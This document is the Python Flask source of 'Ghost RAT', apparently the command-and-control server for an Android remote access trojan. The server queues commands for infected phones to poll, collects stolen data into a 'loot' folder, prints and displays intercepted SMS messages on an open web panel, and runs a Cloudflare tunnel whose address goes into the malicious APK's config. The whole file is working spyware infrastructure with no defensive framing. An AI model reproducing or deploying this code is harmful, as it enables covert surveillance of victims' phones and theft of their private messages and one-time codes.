# Ghost RAT
# Developed by Aditya

from flask import Flask, request, jsonify
import os, time, threading, subprocess, re

# ==============================
# APNA PORT YAHAN BADLO
# ==============================
PORT     = 8000
AUTH_KEY = "ghostrat"
# ==============================

app = Flask(__name__)
os.makedirs("loot", exist_ok=True)

DEVICES = {}

def auth(req):
    return req.headers.get("X-Auth") == AUTH_KEY or req.args.get("k") == AUTH_KEY

def bucket(did):
    if did not in DEVICES:
        DEVICES[did] = {"queue": [], "info": {}, "sms": []}
    return DEVICES[did]

@app.route("/ghost/poll")
def poll():
    if not auth(request): return "denied", 403
    did = request.args.get("id", "?")
    d = bucket(did)
    d["info"] = {"ip": request.remote_addr, "last": time.strftime("%H:%M:%S")}
    cmd = d["queue"].pop(0) if d["queue"] else None
    return jsonify({"cmd": cmd})

@app.route("/ghost/data", methods=["POST"])
def data():
    if not auth(request): return "denied", 403
    did  = request.args.get("id", "?")
    kind = request.args.get("kind", "misc")
    payload = request.get_json(silent=True) or {}
    d = bucket(did)
    if kind == "sms_live":
        incoming = payload if isinstance(payload, list) else [payload]
        d["sms"] = (d["sms"] or []) + incoming
        d["sms"] = d["sms"][-200:]
        for s in incoming:
            print("")
            print("=" * 60)
            print("  SMS FROM: %s" % s.get("from"))
            print("  TIME:     %s" % time.strftime("%H:%M:%S"))
            print("  BODY:     %s" % s.get("body"))
            print("=" * 60)
        return "ok"
    print("[%s] %s %s" % (time.strftime("%H:%M:%S"), kind, str(payload)[:160]))
    return "ok"

@app.route("/SMS")
def slash_sms():
    did = request.args.get("did", "")
    if not did:
        devs = list(DEVICES.keys())
        return "<pre style='background:#000;color:#7cf7a0;padding:16px;font-family:monospace'>" + \
               ("\n".join("  " + d for d in devs) if devs else "no devices yet") + "</pre>"
    d = DEVICES.get(did)
    if not d:
        return "<pre style='color:#f77;background:#000;padding:16px;font-family:monospace'>device not found</pre>"
    arr = d.get("sms") or []
    lines = []
    for s in arr[-30:]:
        ts = s.get("ts") or 0
        t = time.strftime("%H:%M:%S", time.localtime(ts / 1000.0)) if ts else "-"
        lines.append("[%s] %s -> %s" % (t, s.get("from"), s.get("body")))
    return "<pre style='background:#000;color:#c9f7d0;padding:16px;font-family:monospace'>" + \
           ("\n".join(lines) if lines else "no SMS yet") + "</pre>"

@app.route("/")
def home():
    return "<h1 style='color:#7cf7a0;font-family:monospace'>Ghost RAT</h1>" \
           "<p style='color:#5a7c66'>Developed by Aditya</p>"

@app.route("/api/devices")
def api_devices(): return jsonify(DEVICES)

def start_tunnel():
    time.sleep(3)
    try:
        proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://localhost:%d" % PORT],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        url = None
        for line in iter(proc.stdout.readline, ''):
            if not line: continue
            m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if m and not url:
                url = m.group(0)
                print("")
                print("=" * 60)
                print("  CLOUDFLARE TUNNEL READY")
                print("=" * 60)
                print("")
                print("  APK ke assets/config.txt me daalo:")
                print("")
                print("    C2_HOST=%s" % url.replace("https://", ""))
                print("    C2_PATH=/ghost")
                print("    AUTH_KEY=%s" % AUTH_KEY)
                print("")
                print("=" * 60)
                print("  Panel: %s" % url)
                print("=" * 60)
                print("")
    except Exception as e:
        print("[!] Tunnel: %s" % e)

if __name__ == "__main__":
    print("")
    print("=" * 60)
    print("  GHOST RAT - Developed by Aditya")
    print("=" * 60)
    print("  Port:     %d" % PORT)
    print("  AUTH_KEY: %s" % AUTH_KEY)
    print("=" * 60)
    print("")

    t = threading.Thread(target=start_tunnel)
    t.daemon = True
    t.start()

    app.run(host="0.0.0.0", port=PORT, threaded=True)
